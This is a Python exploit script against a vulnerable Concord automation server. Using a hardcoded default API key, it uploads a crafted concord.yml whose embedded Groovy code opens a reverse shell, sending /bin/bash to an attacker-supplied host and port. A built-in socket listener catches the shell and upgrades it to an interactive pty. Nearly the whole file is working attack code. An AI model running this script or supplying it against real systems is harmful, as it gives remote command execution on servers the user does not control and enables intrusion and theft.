#!/usr/bin/python3
import requests, time, sys, os, threading, socket

def listen(ip,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, int(port)))
    s.listen(1)
    print("[+] Reverse shell listening on port " + str(port))
    conn, addr = s.accept()
    print('[+] Connection received from ',addr)
    conn.send("echo ' '\n".encode())
    conn.recv(1024).decode()
    conn.send("python3 -c 'import pty; pty.spawn(\"/bin/bash\");'\n".encode())
    conn.recv(1024).decode()
    while True:
        #Receive data from the target and get user input
        ans = conn.recv(1024).decode()
        sys.stdout.write(ans)
        command = input()
        if command == "exit":
            conn.send("exit\n\exit\n".encode())
            conn.recv(1024).decode()
            conn.close()
            sys.exit()
        #Send command
        command += "\n"
        conn.send(command.encode())
        time.sleep(1)

        #Remove the output of the "input()" function
        sys.stdout.write("\033[A" + ans.split("\n")[-1])

def exploit(rhost,rport):
    url="http://{}:{}/api/v1/process".format(rhost,rport)
    payload = '''configuration:
  dependencies:
    - "mvn://org.codehaus.groovy:groovy-all:pom:2.5.8"

flows:
  default:
    - script: groovy
      body: |
        String host = "{}";
        int port = {};
        String cmd = "/bin/bash";
        Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
        Socket s = new Socket(host, port);
        InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
        OutputStream po = p.getOutputStream(), so = s.getOutputStream();
        while (!s.isClosed()) {{
          while (pi.available() > 0) so.write(pi.read());
          while (pe.available() > 0) so.write(pe.read());
          while (si.available() > 0) po.write(si.read());
          so.flush();
          po.flush();
          Thread.sleep(50);
          try {{
              p.exitValue();
              break;
          }} catch (Exception e) {{}}
        }};
        p.destroy();
        s.close();'''.format(lhost,lport)
    file={"concord.yml":("concord.yml",payload,'application/yml')}
    headers={"Authorization":"Gz0q/DeGlH8Zs7QJMj1v8g"}
    return requests.post(url,headers=headers,files=file).text

if __name__ == "__main__":
        if len(sys.argv) != 5:
                print("(+) usage: {} <RHOST> <RPORT> <LHOST> <LPORT> <WEBPORT>\n".format(sys.argv[0]))
                print("(+) RHOST - Remote server which runs vulnerable version of Concord")
                print("(+) RPORT - Remote application port")
                print("(+) LHOST - Local IP Address to get shell")
                print("(+) LPORT - Local Port to get shell")
                sys.exit(-1)
        rhost = sys.argv[1]
        rport = sys.argv[2]
        lhost = sys.argv[3]
        lport = sys.argv[4]

print("[+] Starting the exploitation of concord through default API_KEY...")
listener_thread = threading.Thread(target=listen, args=(lhost, lport))
listener_thread.start()
print("[+] Sending malicious payload to the target application: http://{}:{}".format(rhost,rport))
exploit(rhost,rport)
listener_thread.join()
